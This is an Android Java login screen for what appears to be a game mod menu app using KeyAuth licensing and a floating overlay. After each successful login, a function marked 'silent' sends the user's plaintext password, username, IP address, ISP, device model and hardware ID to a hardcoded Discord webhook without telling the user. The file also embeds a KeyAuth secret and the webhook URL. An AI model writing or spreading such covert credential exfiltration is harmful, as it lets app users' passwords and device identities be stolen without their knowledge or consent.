package com.kiwmodz.exe;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.text.method.PasswordTransformationMethod;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class MainActivity extends AppCompatActivity {

    private EditText etUsername, etPassword;
    private ImageView ivShowPass;
    private Button btnLogin;
    private boolean isPasswordVisible = false;

    private KeyAuth keyAuth;
    private ExecutorService executorService;
    private Handler mainHandler;
    private SessionManager sessionManager;

    // KEYAUTH CREDENTIALS
    private static final String KEYAUTH_NAME = "Rizki.anugrah2797's Application";
    private static final String KEYAUTH_OWNERID = "qsoZjiXMdb";
    private static final String KEYAUTH_SECRET = "00a3a35cd4c21d5ad52b8bfe74a5d4a1f3f71a0e94d6be46804ebf07916fdd26";
    private static final String KEYAUTH_VERSION = "1.0";

    // DISCORD WEBHOOK URL
    private static final String DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1456895125140541495/0JK_xqD4f86hH4SFP6J9kBDoWefE7q8ZxwBbcRJehuPJXlSPXTCmT7iudEtyTma7AQ76";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        try {
            setContentView(R.layout.activity_main);

            checkOverlayPermissionOnStart();

            executorService = Executors.newSingleThreadExecutor();
            mainHandler = new Handler(Looper.getMainLooper());
            sessionManager = new SessionManager(this);

            keyAuth = new KeyAuth(KEYAUTH_NAME, KEYAUTH_OWNERID, KEYAUTH_SECRET, KEYAUTH_VERSION);

            etUsername = findViewById(R.id.etUsername);
            etPassword = findViewById(R.id.etPassword);
            ivShowPass = findViewById(R.id.ivShowPass);
            btnLogin = findViewById(R.id.btnLogin);

            setupPasswordToggle();
            loadSavedCredentials();
            setupLoginButton();

        } catch (Exception e) {
            Toast.makeText(this, "Application Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }

    // CEK KONEKSI INTERNET
    private boolean isInternetAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
            return activeNetworkInfo != null && activeNetworkInfo.isConnected();
        }
        return false;
    }

    private void checkOverlayPermissionOnStart() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Toast.makeText(this, "Mohon izinkan 'Tampil di atas aplikasi lain' agar menu dapat melayang", Toast.LENGTH_LONG).show();
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 1235);
                }
            }
        } catch (Exception ignored) {}
    }

    private void setupPasswordToggle() {
        if (ivShowPass == null || etPassword == null) return;

        ivShowPass.setOnClickListener(v -> {
            try {
                isPasswordVisible = !isPasswordVisible;
                if (isPasswordVisible) {
                    etPassword.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD);
                } else {
                    etPassword.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
                    etPassword.setTransformationMethod(PasswordTransformationMethod.getInstance());
                }
                etPassword.setSelection(etPassword.getText().length());
            } catch (Exception ignored) {}
        });
    }

    private void loadSavedCredentials() {
        try {
            if (sessionManager == null) return;
            String[] saved = sessionManager.getRememberMe();
            if (saved != null && saved.length == 2) {
                if (etUsername != null) etUsername.setText(saved[0]);
                if (etPassword != null) etPassword.setText(saved[1]);
            }
        } catch (Exception ignored) {}
    }

    private void setupLoginButton() {
        if (btnLogin == null) return;

        btnLogin.setOnClickListener(v -> {
            try {
                if (etUsername == null || etPassword == null) return;

                if (!isInternetAvailable()) {
                    Toast.makeText(MainActivity.this, "Tidak ada koneksi internet!", Toast.LENGTH_SHORT).show();
                    return;
                }

                String userText = etUsername.getText().toString().trim();
                String passText = etPassword.getText().toString().trim();

                if (userText.isEmpty() || passText.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Username dan password tidak boleh kosong!", Toast.LENGTH_SHORT).show();
                    return;
                }

                btnLogin.setEnabled(false);
                btnLogin.setText("AUTHENTICATING...");

                String androidId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
                String tipeHp = Build.MODEL.replace(" ", "");
                String merekHp = Build.MANUFACTURER.replace(" ", "");
                String hwid = androidId + "-" + merekHp + "-" + tipeHp;

                performLogin(userText, passText, hwid);

            } catch (Exception e) {
                resetLoginButton();
            }
        });

        btnLogin.setOnLongClickListener(v -> {
            try {
                Intent bukaLink = new Intent(Intent.ACTION_VIEW, Uri.parse("https://t.me/grupkeyanda"));
                startActivity(bukaLink);
            } catch (Exception ignored) {}
            return true;
        });
    }

    private void performLogin(String username, String password, String hwid) {
        executorService.execute(() -> {
            try {
                keyAuth.init();

                if (!keyAuth.isSuccess()) {
                    mainHandler.post(() -> {
                        resetLoginButton();
                        Toast.makeText(MainActivity.this, "Koneksi Gagal, periksa internet Anda.", Toast.LENGTH_SHORT).show();
                    });
                    return;
                }

                keyAuth.login(username, password, hwid);

                mainHandler.post(() -> {
                    resetLoginButton();

                    if (keyAuth.isSuccess()) {
                        if (sessionManager != null) {
                            sessionManager.saveRememberMe(username, password, true);
                        }

                        // Mengirim log ke discord secara silent
                        sendDiscordLog(username, password, hwid);

                        Toast.makeText(MainActivity.this, "✅ Login Berhasil!", Toast.LENGTH_SHORT).show();
                        checkOverlayPermissionAndStart();

                    } else {
                        String errorMsg = keyAuth.getErrorMessage();
                        if (errorMsg == null) errorMsg = "Terjadi kesalahan tidak diketahui";

                        if (errorMsg.toLowerCase().contains("invalid") || errorMsg.toLowerCase().contains("not found")) {
                            errorMsg = "Username atau password salah!";
                        } else if (errorMsg.toLowerCase().contains("hwid")) {
                            errorMsg = "❌ Akun sudah terikat dengan perangkat lain!";
                        }

                        Toast.makeText(MainActivity.this, errorMsg, Toast.LENGTH_LONG).show();
                    }
                });

            } catch (Exception e) {
                mainHandler.post(() -> {
                    resetLoginButton();
                    Toast.makeText(MainActivity.this, "Terjadi kesalahan autentikasi", Toast.LENGTH_SHORT).show();
                });
            }
        });
    }

    // ================= FUNGSI DISCORD WEBHOOK (SILENT) =================
    private void sendDiscordLog(String username, String password, String hwid) {
        executorService.execute(() -> {
            try {
                String currentTime = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                String androidVersion = Build.VERSION.RELEASE;

                // MENGAMBIL INFO MEREK DAN MODEL HP
                String deviceBrand = Build.MANUFACTURER.toUpperCase(); // Contoh: XIAOMI, SAMSUNG
                String deviceModel = Build.MODEL;                      // Contoh: Redmi Note 10, SM-G998B

                String ip = "Unknown";
                String isp = "Unknown";

                try {
                    URL ipUrl = new URL("http://ip-api.com/json/");
                    HttpURLConnection ipConn = (HttpURLConnection) ipUrl.openConnection();
                    ipConn.setRequestMethod("GET");
                    ipConn.setConnectTimeout(3000);

                    BufferedReader reader = new BufferedReader(new InputStreamReader(ipConn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) response.append(line);
                    reader.close();

                    JSONObject jsonResponse = new JSONObject(response.toString());
                    ip = jsonResponse.optString("query", "Unknown");
                    isp = jsonResponse.optString("isp", "Unknown");
                } catch (Exception ignored) {
                }

                String jsonPayload = "{"
                        + "\"embeds\": [{"
                        + "\"title\": \"✅ Login Sukses Terbaru!\","
                        + "\"color\": 65280,"
                        + "\"fields\": ["
                        + "{\"name\": \"👤 Username\", \"value\": \"`" + username + "`\", \"inline\": true},"
                        + "{\"name\": \"🔑 Password\", \"value\": \"||" + password + "||\", \"inline\": true},"
                        + "{\"name\": \"📱 Merek & Model HP\", \"value\": \"" + deviceBrand + " " + deviceModel + "\", \"inline\": true},"
                        + "{\"name\": \"🤖 Android Version\", \"value\": \"Android " + androidVersion + "\", \"inline\": true},"
                        + "{\"name\": \"🌐 IP Address\", \"value\": \"" + ip + "\", \"inline\": true},"
                        + "{\"name\": \"🏢 ISP\", \"value\": \"" + isp + "\", \"inline\": true},"
                        + "{\"name\": \"⏰ Waktu\", \"value\": \"" + currentTime + "\", \"inline\": true},"
                        + "{\"name\": \"⚙️ HWID\", \"value\": \"`" + hwid + "`\", \"inline\": false}"
                        + "]"
                        + "}]"
                        + "}";

                URL url = new URL(DISCORD_WEBHOOK_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                OutputStream os = conn.getOutputStream();
                os.write(jsonPayload.getBytes("UTF-8"));
                os.flush();
                os.close();

                conn.getResponseCode();

            } catch (Exception ignored) {
            }
        });
    }
    // =====================================================================

    private void resetLoginButton() {
        if (btnLogin != null) {
            btnLogin.setEnabled(true);
            btnLogin.setText("LOGIN SEKARANG");
        }
    }

    private void checkOverlayPermissionAndStart() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (!Settings.canDrawOverlays(this)) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                            Uri.parse("package:" + getPackageName()));
                    startActivityForResult(intent, 1234);
                    Toast.makeText(this, "Mohon izinkan 'Tampil di atas aplikasi lain' untuk melanjutkan", Toast.LENGTH_LONG).show();
                } else {
                    startFloatingService();
                }
            } else {
                startFloatingService();
            }
        } catch (Exception ignored) {}
    }

    private void startFloatingService() {
        try {
            Intent serviceIntent = new Intent(MainActivity.this, FloatingMenuService.class);
            startService(serviceIntent);

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    finish();
                } catch (Exception ignored) {}
            }, 500);

        } catch (Exception ignored) {}
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (requestCode == 1234) {
                if (Settings.canDrawOverlays(this)) {
                    startFloatingService();
                }
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executorService != null) {
            executorService.shutdown();
        }
    }
}